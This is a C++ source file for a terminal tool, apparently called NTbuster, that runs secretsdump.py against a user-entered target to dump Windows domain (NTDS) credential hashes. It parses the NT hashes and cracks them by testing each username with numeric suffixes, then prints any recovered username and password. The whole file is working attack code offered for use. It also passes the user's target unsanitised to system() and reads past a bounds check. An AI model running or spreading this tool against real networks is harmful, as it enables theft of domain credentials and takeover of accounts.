#include <iostream>
#include <vector>
#include "ntlm.h"
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <unordered_map>
#include <regex>
#include <ncurses.h>
#include <cstring>
#include <cstring>
using namespace std;

class Cracker {
    public:
        string target;

        std::vector<string> generate(string username) {
            std::vector<string> usernames;
            std::string busername = username;

            for (const auto& extension : extensions) {    
                username.append(extension);
                usernames.push_back(username);
                username = busername;
            }
            return usernames;
        }

        std::pair<bool, string> crack(std::vector<string> wordlist, const char* hash){
            for (int i = 0; i < wordlist.size(); i++) {
                const char* generated_hash = gen_ntlm(wordlist[i]);
                if (std::strcmp(hash, generated_hash) == 0) {
                    return std::make_pair(true, wordlist[i]);
                }
            }
            return std::make_pair(false, "");
        }
        
        string get_ntds() {
            std::string command = "/usr/bin/python3 ./scripts/secretsdump.py ";
            std::stringstream ss;
            ss << command << target << " > /tmp/output.txt";
            command = ss.str();
            system(command.c_str());
            ifstream fin("/tmp/output.txt");
            string output = "";
            while (fin) {
                string line;
                getline(fin, line);
                output += line + "\n";
            }
            return output;
        }

        std::unordered_map<std::string, std::string>  parse_hashes(const std::string& input) {        
            std::unordered_map<std::string, std::string> result;
            std::regex re("nthash\\)(.*?)\\[\\*\\]");
            std::string modified_input = input; // Create a non-const copy of the input string
            std::string helper_for_regex = "\n";
            std::smatch match;
            size_t pos = 0;
            std::string matched_str;
            std::vector<std::string> split_result;
            std::vector<std::string> split_result_line;
            std::string token;
            std::string token_line;
            std::istringstream iss("");
            std::istringstream iss_line("");
            std::unordered_map<std::string, std::string> creds;

            while ((pos = modified_input.find(helper_for_regex, pos)) != std::string::npos) {
                modified_input.replace(pos, helper_for_regex.length(), "^");
                pos += 6; // Move past the replaced string
            }
            
            if (std::regex_search(modified_input, match, re)) {
                matched_str = match[1].str();
            };

            iss.str(matched_str);
            
            while (std::getline(iss, token, '^')){
                split_result.push_back(token);
            }

            for (const auto& str : split_result) {
                iss_line.clear();
                split_result_line.clear();
                iss_line.str(str);

                while (std::getline(iss_line, token, ':')){
                    split_result_line.push_back(token);
                }
                if (split_result_line.size() >= 3) {
                    creds[split_result_line[0]] = split_result_line[3];
                }
            }
            return creds;
        }

        std::string launch() {
            std::string output = get_ntds();
            std::unordered_map<std::string, std::string> creds = parse_hashes(output);
            for (const auto& kv : creds) {
                std::vector<string> wl = generate(kv.first);
                std::pair<bool, string> crack_status = crack(wl, kv.second.c_str());
                // std::cout << kv.second.c_str() << std::endl;
                if (crack_status.first) {
                    std::string resp = "Password Cracked: username is " +
                        kv.first +
                        " password is " +
                        crack_status.second;
                        return resp;
                }
            }
            return std::string();
        }

    private:
        std::vector<std::string> extensions = {
            "123",
            "1234",
            "12345",
            "123456",
            "001",
            "002",
            "003",
            "004",
            "005",
            "007",
            "008",
            "009"
    };
};

int main() {
    // initialize ncurses
    initscr();
    cbreak();
    keypad(stdscr, TRUE);

    // set up colors
    start_color();
    init_pair(1, COLOR_CYAN, COLOR_BLACK);
    init_pair(2, COLOR_MAGENTA, COLOR_BLACK);
    init_pair(3, COLOR_YELLOW, COLOR_BLACK);
    init_pair(4, COLOR_GREEN, COLOR_BLACK);
    init_pair(5, COLOR_RED, COLOR_BLACK);
    attron(COLOR_PAIR(1));

    // draw banner
    const char* banner_text = "    _   __________               __           \n"
                     "   / | / /_  __/ /_  __  _______/ /____  _____\n"
                     "  /  |/ / / / / __ \\/ / / / ___/ __/ _ \\/ ___/\n"
                     " / /|  / / / / /_/ / /_/ (__  ) /_/  __/ /    \n"
                     "/_/ |_/ /_/ /_.___/\\__,_/____/\\__/\\___/_/     \n";

    int y = LINES / 2 - 6;
    printw(banner_text);
    move(y + 6, 0);
    refresh();

    // get target value from user input
    mvprintw(LINES / 2 + 2, COLS / 2 - 12, "Enter target: ");
    echo();
    char target[100];
    getstr(target);
    noecho();
    clear();
    target[strcspn(target, "\n")] = 0;

    // display user's input
    printw(banner_text);
    refresh();

    // use target value
    Cracker C;
    C.target = target;
    std::string response = C.launch();
    int response_len = response.length();
    int response_x = (COLS - response_len) / 2;
    int response_y = LINES / 2 + 2;
    mvprintw(response_y, response_x, "%s", response.c_str());
    refresh();
    getch();

    // clean up ncurses and exit
    endwin();
    return 0;
}